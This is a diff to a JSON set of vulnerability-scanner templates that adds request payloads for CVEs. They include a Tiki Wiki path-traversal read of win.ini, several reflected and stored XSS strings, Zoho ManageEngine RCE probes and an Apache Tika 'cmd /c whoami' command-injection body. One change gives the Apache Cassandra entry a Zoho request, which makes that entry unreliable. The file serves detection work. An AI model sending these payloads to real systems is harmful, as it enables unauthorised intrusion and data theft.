@@ -2084,6 +2084,21 @@
       ]
     },
     {
+      "id": "CVE-2010-4239",
+      "info": {
+        "name": "Tiki Wiki CMS Groupware 5.2 - Local File Inclusion",
+        "severity": "high"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/tiki-jsplugin.php?plugin=x&language=../../../../../../../../../../windows/win.ini"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2010-4282",
       "info": {
         "name": "phpShowtime 2.0 - Directory Traversal",
@@ -6234,11 +6249,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "Connection": "close",
             "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
-            "Content-type": "image/jp2"
+            "Content-type": "image/jp2",
+            "Connection": "close"
           },
           "method": "PUT",
           "path": [
@@ -7187,6 +7202,21 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/wp-content/plugins/sagepay-server-gateway-for-woocommerce/includes/pages/redirect.php?page=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2018-5715",
+      "info": {
+        "name": "SugarCRM 3.5.1 - Reflected XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php?action=Login&module=Users&print=a&%22%2F%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E"
           ]
         }
       ]
@@ -16232,6 +16262,21 @@
       ]
     },
     {
+      "id": "CVE-2021-44077",
+      "info": {
+        "name": "Zoho ManageEngine ServiceDesk Plus - Remote Code Execution",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/RestAPI/ImportTechnicians"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-44103",
       "info": {
         "name": "KOGA 0.14.9 - Privilege Escalation",
@@ -16297,6 +16342,20 @@
       ]
     },
     {
+      "id": "CVE-2021-44515",
+      "info": {
+        "name": "Zoho ManageEngine Desktop Central - Remote Code Execution",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /STATE_ID/123/agentLogUploader HTTP/1.1\nHost: {{Hostname}}\nCookie: STATE_COOKIE=&_REQS/_TIME/123\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-44521",
       "info": {
         "name": "Apache Cassandra Load UDF RCE",
@@ -16305,8 +16364,7 @@
       "requests": [
         {
           "raw": [
-            "GET /login/ HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\n",
-            "POST /login/ HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{BaseURL}}\nContent-Type: application/x-www-form-urlencoded\nReferer: {{BaseURL}}/admin/airflow/login\n\ncsrf_token={{csrf_token}}&username={{username}}&password={{password}}\n"
+            "GET /STATE_ID/123/agentLogUploader HTTP/1.1\nHost: {{Hostname}}\nCookie: STATE_COOKIE=&_REQS/_TIME/123\n"
           ]
         }
       ]
@@ -16505,6 +16563,20 @@
       ]
     },
     {
+      "id": "CVE-2022-0140",
+      "info": {
+        "name": "WordPress Visual Form Builder < 3.0.6 - Unauthenticated Information Disclosure",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /wp-admin/admin.php?page=vfb-export HTTP/1.1\nHost: {{Hostname}}\nReferer: {{RootURL}}/wp-admin/admin.php?page=vfb-export\nContent-Type: application/x-www-form-urlencoded\nOrigin: {{RootURL}}\n\nvfb-content=entries&format=csv&entries_form_id=1&entries_start_date=0&entries_end_date=0&submit=Download+Export+File\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2022-0148",
       "info": {
         "name": "All-in-one Floating Contact Form < 2.0.4 - Authenticated Reflected XSS",
@@ -16545,6 +16617,21 @@
           "raw": [
             "POST /wp-login.php HTTP/1.1\nHost: {{Hostname}}\nOrigin: {{RootURL}}\nContent-Type: application/x-www-form-urlencoded\nCookie: wordpress_test_cookie=WP%20Cookie%20check\n\nlog={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1\n",
             "POST /wp-admin/admin-ajax.php?action=wprss_fetch_items_row_action HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\nCookie: wordpress_test_cookie=WP%20Cookie%20check\n\nid=%3Chtml%3E%3Cimg+src+onerror%3Dalert%28%60document.domain%60%29%3E\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-0208",
+      "info": {
+        "name": "WordPress Plugin MapPress < 2.73.4 - Reflected XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/?mapp_iframe=1&mapid=--%3E%3Cimg%20src%20onerror=alert(document.domain)%3E"
           ]
         }
       ]
@@ -16666,6 +16753,21 @@
           "raw": [
             "GET / HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\n",
             "POST /index.php/backend_api/ajax_get_calendar_events HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\n\ncsrfToken={{csrf_token}}&startDate=2022-01-01&endDate=2022-01-01\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-0595",
+      "info": {
+        "name": "Drag and Drop Multiple File Upload - Contact Form 7 < 1.3.6.3 - Unauthenticated Stored XSS",
+        "severity": "medium"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=---------------------------92633278134516118923780781161\n\n-----------------------------92633278134516118923780781161\nContent-Disposition: form-data; name=\"size_limit\"\n\n10485760\n-----------------------------92633278134516118923780781161\nContent-Disposition: form-data; name=\"action\"\n\ndnd_codedropz_upload\n-----------------------------92633278134516118923780781161\nContent-Disposition: form-data; name=\"type\"\n\nclick\n-----------------------------92633278134516118923780781161\nContent-Disposition: form-data; name=\"upload-file\"; filename=\"{{randstr}}.svg\"\nContent-Type: image/jpeg\n\n<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(document.domain)\"/>\n-----------------------------92633278134516118923780781161--\n",
+            "GET /wp-content/uploads/wp_dndcf7_uploads/wpcf7-files/{{randstr}}.svg HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
